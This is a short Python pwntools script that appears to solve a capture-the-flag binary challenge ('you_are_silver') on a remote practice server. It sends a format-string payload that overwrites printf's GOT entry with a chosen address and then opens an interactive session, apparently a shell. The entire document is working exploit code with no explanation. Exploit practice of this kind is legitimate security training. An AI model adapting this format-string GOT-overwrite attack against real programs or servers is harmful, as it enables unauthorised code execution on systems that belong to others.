from pwn import *
r=remote("ctf.j0n9hyun.xyz",3022)
#r=process("./you_are_silver")
oneshot=0x0000000000400750
printf=0x601028
context.log_level='debug'
pay=f'%{oneshot}c%9$ln'.ljust(24,' ')+p64(printf).decode()
print(pay)
r.sendline(pay)
r.interactive()
